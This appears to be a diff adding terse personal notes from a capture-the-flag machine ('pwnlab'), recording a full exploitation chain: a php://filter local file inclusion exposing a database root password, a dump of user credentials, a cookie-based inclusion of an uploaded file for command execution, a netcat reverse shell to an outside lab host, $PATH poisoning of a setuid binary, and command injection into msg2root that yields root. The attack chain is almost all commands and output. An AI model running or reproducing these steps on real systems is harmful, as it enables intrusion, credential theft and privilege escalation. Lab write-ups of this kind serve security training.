@@ -1,0 +1,63 @@
+
+http://10.0.0.93/?page=php://filter/convert.base64-encode/resource=config
+
+echo -n "PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+" | base64 -d
+<?php
+$server   = "localhost";
+$username = "root";
+$password = "H4u%QJ_H99";
+$database = "Users";
+?>
+
+mysql -h 10.0.0.93 -u root -p
+> select * from users;
++------+------------------+
+| user | pass             |
++------+------------------+
+| kent | Sld6WHVCSkpOeQ== |
+| mike | U0lmZHNURW42SQ== |
+| kane | aVN2NVltMkdSbw== |
++------+------------------+
+
+# creds
+kent:JWzXuBJJNy
+mike:SIfdsTEn6I
+kane:iSv5Ym2GRo
+
+# Upload cmd.php.png
+cat index.php
+# we can include a file through a cookie 'lang'
+curl -v --cookie "lang=../upload/053051f45c6bc3e2e0bff3254896625a.png" -o aqui http://10.0.0.93/index.php?cmd=ls
+
+# we can get a shell as:
+# curl -v --cookie "lang=../upload/053051f45c6bc3e2e0bff3254896625a.png" -o aqui http://10.0.0.93/index.php?cmd=nc -e /bin/sh 10.0.0.148 443
+curl -v --cookie "lang=../upload/053051f45c6bc3e2e0bff3254896625a.png" -o aqui http://10.0.0.93/index.php?cmd=nc%20-e%20%2Fbin%2Fsh%2010.0.0.148%20443
+
+# kane is the guy to reach mike
+su - kane
+kane:iSv5Ym2GRo
+kane@pwnlab:~$ ls
+msgmike
+
+CUANDO ENCONTREMOS UN EJECUTABLE TRATAR DE ENVENENAR $PATH !!!!!!!!!!!!!!!!!
+
+echo "/bin/bash" > cat
+chmod +x cat
+PATH=.:$PATH ./msgmike
+
+cd /home/mike
+# ltrace ./msg2root 
+# __libc_start_main(0x80484ab, 1, 0xffebada4, 0x8048520 <unfinished ...>
+# printf("Message for root: ")                                                                                       = 18
+# fgets(Message for root: AAAAAAAAAAA
+# "AAAAAAAAAAA\n", 100, 0xf7f19580)                                                                            = 0xffebac88
+# asprintf(0xffebacec, 0x80485c4, 0xffebac88, 1)                                                                     = 44
+# system("/bin/echo AAAAAAAAAAA\n >> /root/"...AAAAAAAAAAA
+
+# we can inject a command to system
+
+mike@pwnlab:/home/mike$ ./msg2root
+Message for root: ; bash -p
+
+bash-4.3# id
+uid=1002(mike) gid=1002(mike) euid=0(root) egid=0(root) groups=0(root),1003(kane)
